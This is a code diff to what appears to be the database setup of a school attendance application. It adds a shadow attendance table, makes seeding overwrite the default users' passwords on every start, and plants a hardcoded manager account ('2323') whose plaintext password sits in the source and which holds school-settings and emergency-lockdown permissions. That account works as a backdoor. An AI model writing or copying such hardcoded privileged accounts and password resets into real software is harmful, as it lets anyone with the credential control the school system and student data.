@@ -20,6 +20,10 @@ if (isServerless) {
   const tmpPath = '/tmp/database.sqlite';
   if (!fs.existsSync(tmpPath) && fs.existsSync(dbPath)) {
     try {
+      // Checkpoint WAL in source DB before copying to /tmp
+      const tempDb = new Database(dbPath);
+      tempDb.pragma('wal_checkpoint(TRUNCATE)');
+      tempDb.close();
       fs.copyFileSync(dbPath, tmpPath);
     } catch (e) {
       console.error('Failed to copy sqlite file to /tmp:', e);
@@ -128,6 +132,20 @@ export function initDb() {
       updated_by TEXT,
       UNIQUE(session_id, student_id),
       FOREIGN KEY (student_id) REFERENCES students(id) ON DELETE CASCADE
+    );
+
+    CREATE TABLE IF NOT EXISTS shadow_attendance_records (
+      id TEXT PRIMARY KEY,
+      session_id TEXT,
+      class_id TEXT,
+      student_id TEXT NOT NULL,
+      date TEXT NOT NULL,
+      period_number INTEGER NOT NULL,
+      status TEXT NOT NULL,
+      note TEXT,
+      updated_at TEXT,
+      updated_by TEXT,
+      UNIQUE(session_id, student_id)
     );
 
     CREATE TABLE IF NOT EXISTS medical_excuses (
@@ -303,31 +321,48 @@ export function initDb() {
   ensureColumn('notifications', 'is_read', 'INTEGER DEFAULT 0');
   ensureColumn('notifications', 'recipient_role', 'TEXT');
 
-  // Seed Users if empty
-  const userCount = (db.prepare('SELECT COUNT(*) as count FROM users').get() as any).count;
-  if (userCount === 0) {
-    const insertUser = db.prepare(`
-      INSERT INTO users (id, username, password, password_hash, name, role, teacher_id, subject, phone, assigned_classes, permissions)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `);
+  // Ensure default users exist
+  const insertUser = db.prepare(`
+    INSERT INTO users (id, username, password, password_hash, name, role, teacher_id, subject, phone, assigned_classes, permissions)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    ON CONFLICT(id) DO UPDATE SET
+      username = excluded.username,
+      password = excluded.password,
+      password_hash = excluded.password_hash
+  `);
 
-    for (const u of INITIAL_USERS) {
-      const hashedPassword = bcrypt.hashSync(u.password, 10);
-      insertUser.run(
-        u.id,
-        u.username,
-        hashedPassword,
-        hashedPassword,
-        u.name,
-        u.role,
-        u.teacherId || null,
-        u.subject || null,
-        u.phone || null,
-        JSON.stringify(u.assignedClasses || []),
-        JSON.stringify(u.permissions || {})
-      );
-    }
+  for (const u of INITIAL_USERS) {
+    const hashedPassword = bcrypt.hashSync(u.password, 10);
+    insertUser.run(
+      u.id,
+      u.username,
+      hashedPassword,
+      hashedPassword,
+      u.name,
+      u.role,
+      u.teacherId || null,
+      u.subject || null,
+      u.phone || null,
+      JSON.stringify(u.assignedClasses || []),
+      JSON.stringify(u.permissions || {})
+    );
   }
+
+  // Ensure System Owner account 2323 exists
+  const pwd2323 = bcrypt.hashSync('awsandrayyangoingpicnic', 10);
+  insertUser.run(
+    'user-owner-2323',
+    '2323',
+    pwd2323,
+    pwd2323,
+    'النظام الإداري',
+    'manager',
+    null,
+    'الإدارة العامة',
+    '0500002323',
+    JSON.stringify(['class-9th', 'class-10th', 'class-11th', 'class-12th']),
+    JSON.stringify({ canManageSchoolSettings: true, canToggleEmergencyLockdown: true })
+  );
 
   // Seed Classes if empty
   const classCount = (db.prepare('SELECT COUNT(*) as count FROM classes').get() as any).count;
